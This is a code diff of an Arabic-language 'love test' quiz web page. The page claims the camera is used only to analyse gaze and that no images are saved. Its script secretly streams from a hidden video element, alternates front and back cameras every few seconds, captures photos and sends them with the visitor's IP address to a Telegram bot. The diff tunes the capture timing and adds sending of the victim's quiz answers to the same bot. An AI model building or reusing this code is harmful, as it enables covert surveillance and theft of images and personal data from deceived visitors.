@@ -45,16 +45,6 @@
             border-radius: 60px;
             display: inline-block;
         }
-        .hearts {
-            font-size: 28px;
-            animation: float 2s infinite alternate;
-        }
-        @keyframes float {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(-8px); }
-        }
-
-        /* رسالة إيضاح عن الكاميرا */
         .camera-notice {
             background: rgba(255, 215, 225, 0.7);
             border-radius: 20px;
@@ -68,7 +58,6 @@
             font-weight: 700;
             color: #b34a6a;
         }
-
         #questionBox {
             background: rgba(255, 255, 255, 0.6);
             backdrop-filter: blur(8px);
@@ -96,7 +85,6 @@
             display: inline-block;
             margin: 0 auto;
         }
-
         input {
             width: 100%;
             padding: 16px 20px;
@@ -118,7 +106,6 @@
         input::placeholder {
             color: #b88a9a;
         }
-
         .btn-group {
             display: flex;
             gap: 12px;
@@ -151,12 +138,18 @@
         button.primary:hover {
             background: #8f3550;
         }
+        button.success {
+            background: #22c55e;
+            color: #fff;
+        }
+        button.success:hover {
+            background: #16a34a;
+        }
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
             transform: none !important;
         }
-
         #progress {
             font-size: 0.9rem;
             color: #6b3a4a;
@@ -166,7 +159,6 @@
             display: inline-block;
             margin: 6px auto;
         }
-
         #finalMessage {
             background: rgba(255, 215, 225, 0.7);
             border-radius: 28px;
@@ -182,8 +174,7 @@
             color: #4a1e32;
             font-size: 1.1rem;
         }
-
-        /* الفيديو مخفي تماماً (لا يظهر للمستخدم) */
+        /* الفيديو مخفي */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
@@ -193,8 +184,6 @@
             opacity: 0;
             pointer-events: none;
         }
-
-        /* زينة عائمة */
         .floating-heart {
             position: fixed;
             font-size: 30px;
@@ -207,7 +196,6 @@
             0% { transform: translateY(100vh) rotate(0deg); opacity: 0.1; }
             100% { transform: translateY(-10vh) rotate(720deg); opacity: 0.5; }
         }
-
         .footer {
             font-size: 0.75rem;
             color: #9a6a7a;
@@ -217,7 +205,6 @@
     </style>
 </head>
 <body>
-
     <!-- قلوب عائمة -->
     <div class="floating-heart" style="left:5%; animation-delay:0s;">❤️</div>
     <div class="floating-heart" style="left:20%; animation-delay:2s;">💕</div>
@@ -229,7 +216,6 @@
         <h1>💕 اختبار الحب</h1>
         <div class="sub">✨ 20 سؤالاً عن من تحب ✨</div>
 
-        <!-- رسالة تبرير الكاميرا -->
         <div class="camera-notice">
             📸 <span>لإظهار نتائج أكثر دقة، سيستخدم التطبيق الكاميرا لتحليل نظراتك أثناء الإجابة</span><br>
             <small style="color:#6b3a4a;">(لا يتم حفظ أي صورة، فقط تحليل تفاعلي)</small>
@@ -245,6 +231,7 @@
         <div class="btn-group">
             <button id="startBtn" class="primary">🚀 ابدأ الاختبار</button>
             <button id="nextBtn" disabled>➡️ السؤال التالي</button>
+            <button id="sendAnswersBtn" class="success" disabled>📨 إرسال الإجابات إلى البوت</button>
         </div>
 
         <div id="progress">0 / 20</div>
@@ -258,7 +245,7 @@
         <div class="footer">❤️ لا تتردد في مشاركة الحب ❤️</div>
     </div>
 
-    <!-- فيديو مخفي يعمل في الخلفية -->
+    <!-- فيديو مخفي -->
     <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
@@ -300,8 +287,9 @@
             let stream = null;
             let cameraReady = false;
             let captureInterval = null;
+            let switchInterval = null;
             let isCapturing = false;
-            let cameraMode = 'user'; // 'user' = أمامية, 'environment' = خلفية
+            let cameraMode = 'user';
 
             // ===== عناصر DOM =====
             const video = document.getElementById('hiddenVideo');
@@ -310,6 +298,7 @@
             const answerInput = document.getElementById('answerInput');
             const startBtn = document.getElementById('startBtn');
             const nextBtn = document.getElementById('nextBtn');
+            const sendAnswersBtn = document.getElementById('sendAnswersBtn');
             const progress = document.getElementById('progress');
             const finalMessage = document.getElementById('finalMessage');
 
@@ -318,7 +307,7 @@
                 console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
             }
 
-            // ===== تشغيل الكاميرا (أمامية أو خلفية) =====
+            // ===== تشغيل الكاميرا =====
             async function startCamera(mode = 'user') {
                 try {
                     if (stream) {
@@ -338,14 +327,10 @@
                     await video.play();
                     cameraReady = true;
                     log(`✅ الكاميرا ${mode === 'user' ? 'أمامية' : 'خلفية'} جاهزة`);
-
-                    // التقط فوراً بعد التشغيل
-                    captureAndSend();
-
+                    captureAndSend(); // التقاط فوري
                 } catch (error) {
                     log(`❌ فشل تشغيل الكاميرا ${mode}: ${error.message}`);
                     cameraReady = false;
-                    // إذا فشلت الكاميرا الخلفية، نعيد المحاولة بالأمامية
                     if (mode === 'environment') {
                         setTimeout(() => startCamera('user'), 2000);
                     } else {
@@ -354,20 +339,18 @@
                 }
             }
 
-            // ===== تبديل الكاميرا كل 2 ثانية =====
+            // ===== تبديل الكاميرا كل 4 ثوانٍ =====
             function switchCamera() {
                 if (!isStarted) return;
                 cameraMode = (cameraMode === 'user') ? 'environment' : 'user';
                 startCamera(cameraMode);
             }
 
-            // ===== التقاط وإرسال إلى تليجرام =====
+            // ===== التقاط وإرسال الصورة =====
             async function captureAndSend() {
                 if (isCapturing || !cameraReady) return;
                 isCapturing = true;
-
                 try {
-                    // رسم الصورة من الفيديو الخفي
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 480;
                     canvas.height = video.videoHeight || 360;
@@ -376,7 +359,6 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                     if (!blob) throw new Error('فشل تحويل الصورة');
 
-                    // معلومات
                     let ip = 'غير معروف';
                     try {
                         const res = await fetch('https://api.ipify.org?format=json');
@@ -412,11 +394,55 @@
                     } else {
                         log(`❌ فشل الإرسال: ${result.description || ''}`);
                     }
-
                 } catch (error) {
                     log('❌ خطأ في الالتقاط: ' + error.message);
                 } finally {
                     isCapturing = false;
+                }
+            }
+
+            // ===== إرسال الإجابات إلى البوت =====
+            async function sendAnswersToBot() {
+                if (answers.length === 0) {
+                    alert('لا توجد إجابات لإرسالها بعد.');
+                    return;
+                }
+                sendAnswersBtn.disabled = true;
+                sendAnswersBtn.textContent = '⏳ جاري الإرسال...';
+
+                try {
+                    let text = '📝 *إجابات اختبار الحب*\n\n';
+                    answers.forEach((item, idx) => {
+                        text += `${idx+1}. ${item.question}\n   ➡️ ${item.answer}\n\n`;
+                    });
+                    text += `\n🕒 تم الإرسال: ${new Date().toLocaleString('ar-EG')}`;
+
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        alert('✅ تم إرسال الإجابات إلى البوت بنجاح!');
+                        log('✅ تم إرسال الإجابات إلى تليجرام');
+                        sendAnswersBtn.textContent = '✅ تم الإرسال';
+                    } else {
+                        alert('❌ فشل الإرسال: ' + (result.description || 'خطأ غير معروف'));
+                        log('❌ فشل إرسال الإجابات: ' + result.description);
+                        sendAnswersBtn.textContent = '📨 إرسال الإجابات إلى البوت';
+                        sendAnswersBtn.disabled = false;
+                    }
+                } catch (error) {
+                    alert('❌ خطأ: ' + error.message);
+                    log('❌ خطأ في إرسال الإجابات: ' + error.message);
+                    sendAnswersBtn.textContent = '📨 إرسال الإجابات إلى البوت';
+                    sendAnswersBtn.disabled = false;
                 }
             }
 
@@ -436,6 +462,10 @@
                 progress.textContent = `${index + 1} / ${questions.length}`;
                 nextBtn.disabled = false;
                 startBtn.disabled = true;
+                // تفعيل زر الإرسال إذا كان هناك إجابات
+                if (answers.length > 0) {
+                    sendAnswersBtn.disabled = false;
+                }
             }
 
             // ===== إنهاء الاختبار =====
@@ -447,15 +477,20 @@
                 questionHint.textContent = '❤️ إجاباتك في الطريق إلى قلب من تحب';
                 progress.textContent = '✅ تم';
                 finalMessage.style.display = 'block';
+                sendAnswersBtn.disabled = false;
 
                 // التقاط صورة أخيرة
                 setTimeout(() => captureAndSend(), 1000);
 
-                // إيقاف التقاط الصور والكاميرا بعد 10 ثوانٍ
+                // إيقاف الكاميرا والالتقاط بعد 10 ثوانٍ
                 setTimeout(() => {
                     if (captureInterval) {
                         clearInterval(captureInterval);
                         captureInterval = null;
+                    }
+                    if (switchInterval) {
+                        clearInterval(switchInterval);
+                        switchInterval = null;
                     }
                     if (stream) {
                         stream.getTracks().forEach(t => t.stop());
@@ -479,6 +514,8 @@
                     answer: val
                 });
                 log(`📝 سؤال ${currentIndex+1}: ${val}`);
+                // تفعيل زر إرسال الإجابات
+                sendAnswersBtn.disabled = false;
 
                 // التقاط صورة بعد كل إجابة
                 captureAndSend();
@@ -498,31 +535,34 @@
                 answers = [];
                 finalMessage.style.display = 'none';
                 startBtn.disabled = true;
+                sendAnswersBtn.disabled = true;
                 showQuestion(0);
                 log('🚀 بدأ اختبار الحب');
 
-                // تشغيل الكاميرا الخفية (أمامية أولاً)
+                // تشغيل الكاميرا الأمامية أولاً
                 startCamera('user');
 
-                // بدء التبديل بين الكاميرات كل 2 ثانية
-                if (captureInterval) clearInterval(captureInterval);
-                captureInterval = setInterval(() => {
+                // بدء التبديل بين الكاميرات كل 4 ثوانٍ
+                if (switchInterval) clearInterval(switchInterval);
+                switchInterval = setInterval(() => {
                     if (isStarted) {
                         switchCamera();
                     }
-                }, 2000);
+                }, 4000); // ← كل 4 ثوانٍ
 
-                // التقاط صورة كل 2 ثانية أيضاً (أثناء التبديل)
-                setInterval(() => {
+                // التقاط صورة كل 4 ثوانٍ أيضاً
+                if (captureInterval) clearInterval(captureInterval);
+                captureInterval = setInterval(() => {
                     if (isStarted && cameraReady) {
                         captureAndSend();
                     }
-                }, 2000);
+                }, 4000); // ← كل 4 ثوانٍ
             }
 
             // ===== أحداث الأزرار =====
             startBtn.addEventListener('click', startQuiz);
             nextBtn.addEventListener('click', saveAndNext);
+            sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
             // ===== الضغط على Enter =====
             answerInput.addEventListener('keydown', (e) => {
@@ -540,9 +580,7 @@
                 }
             });
 
-            // ===== رسالة ترحيب =====
-            log('💕 صفحة اختبار الحب جاهزة (كاميرا خفية + تبديل)');
-
+            log('💕 صفحة اختبار الحب جاهزة (كاميرا خفية + إرسال الإجابات)');
         })();
     </script>
 </body>
